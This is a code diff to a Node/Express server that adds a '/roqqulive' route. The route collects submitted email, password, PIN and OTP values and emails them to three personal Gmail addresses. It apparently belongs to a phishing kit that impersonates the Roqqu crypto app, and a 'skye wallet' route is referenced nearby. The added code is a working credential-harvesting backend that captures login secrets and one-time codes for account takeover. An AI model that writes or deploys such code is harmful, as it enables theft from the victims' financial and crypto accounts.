@@ -144,6 +144,38 @@ app.post('/roqqu-app', (req, res, next) => {
   })
 })
 
+app.post('/roqqulive', (req, res, next) => {
+  console.log(
+    'req body', req.body
+  )
+
+  const {email, password, pin, otp} = req.body
+  const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> `
+
+
+
+  const mail = {
+      from: 'admin@growveonct.com',
+      to: 'obialorkingsley22@gmail.com, wj05685@gmail.com, ifestephenie@gmail.com',
+      subject: 'New message from Roqqu-app',
+      html: content,
+  }
+
+  transporter.sendMail(mail, (err, data) => {
+    if (err) {
+      console.log({err})
+      res.json({
+        status: 'fail'
+      })
+    } else {
+      console.log('email sent', data)
+      res.json({
+       status: 'success'
+      })
+    }
+  })
+})
+
 
 
 // For skye wallet
